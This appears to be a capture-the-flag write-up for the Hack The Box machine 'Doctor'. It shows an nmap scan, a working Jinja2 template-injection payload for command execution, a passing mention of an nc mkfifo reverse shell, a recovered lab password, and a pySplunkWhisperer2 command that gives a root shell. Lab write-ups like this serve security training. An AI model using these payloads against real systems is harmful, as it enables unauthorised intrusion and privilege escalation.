Started with a nmap scan
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzyPiL1j9E6lyOgxqgosQ64mBwocTGo1DpclHHV5w28qPbnBJL32hfDNgUhAeaq7PL8zOQlKWprEnkfBNTUagvcX7deMgPsJ6zow/K+WPqIUU5+LbQQ9TV6YeiWiPrO1W9dwwY0ZTXkkG6905kLDsKtCQZqt0VUGPiyWnZswXwWjbBo9KBF1dctUKv+MuyPLQ2qAr5X9LL21/tWw0fLrIKLkCvdaMI9tVYXeFNZ1WyJSI4BfCB5OrNzpr4RN/CaGSjSiBGn2zkegsk+zJpePSp9qfP/fMwEyDQ1c8kei0g35Neaw5Mob1q3R0L6w8fTAnsYo9bYlnHNOl4Juon0QaOfzDry/c4Hmwi43ypeUlv2zUdgGDUdemG79/nHx/rtLbBvdROI3UIjn6HOweHJs9VmwUjx509xZGoCwRcB0lIrDg9pWitWbg+qMTBvvYrLWgSovjpnilu8OcVituQHoXrrLMFVREY0SzF7K6SqbBO7QTrKODzrf1aH5gdgQNCE18=
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHMC7+4t7zcs7cPg4JoOZiJF+MiORNU6ky66rLocXDEySgRgkeNf2uzjblvpnn2QYid7TCQUwQ/6Bbz2yFM7jg=
|   256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEF0lJKhEknY94/rK0D2et4K9Tp2E6CsYp0GxwdNJGhs
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http syn-ack ttl 63 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23:4e5c:546d:8895:0f5f:8f42:5e90:6787
| SHA-1: 7ec9:1bb7:343f:f7f6:bdd7:d015:d720:6f6f:19e2:098b
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
```
The main site is pretty static and the other site is running `splunk` version `8.0.5` going to look at the first site first and there is a possible domain on the site `doctors.htb` going to run a gobuster and see if there is anything else
```
/login
/register
/archive
/home
/account
/reset_password
```
We can make a account and when we make a new post with `{{7*7}}` and if we look at the `/archive` page we get `49` so its most likely running `jinja2` if we do this payload we get RCE 
```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
and we get the `web` user back and we can `base64` a `nc mkfifo` payload and now we have access to the machine in the `/var/log/apache2/backup` file there is a password reset and after the `email=` is actually a password for the user `shaun` `Guitar123` now we have access as this user there is a local priv exploit called `pySplunkWhisperer2`  and we can run this exploit to get a reverse shell as `root` `python3 exploit.py --username shaun --password Guitar123 --payload 'shell'` and now we are root 